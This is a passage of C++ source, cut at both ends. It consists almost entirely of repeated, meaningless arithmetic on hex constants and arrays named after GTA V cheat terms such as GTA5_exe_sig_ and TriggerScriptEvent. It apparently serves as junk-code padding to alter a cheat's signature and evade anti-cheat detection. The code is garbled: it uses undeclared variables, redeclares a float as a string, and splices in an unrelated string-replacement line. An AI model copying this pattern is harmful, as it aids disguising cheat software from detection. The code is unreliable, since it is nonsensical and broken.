						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<Pitch>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</Pitch>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
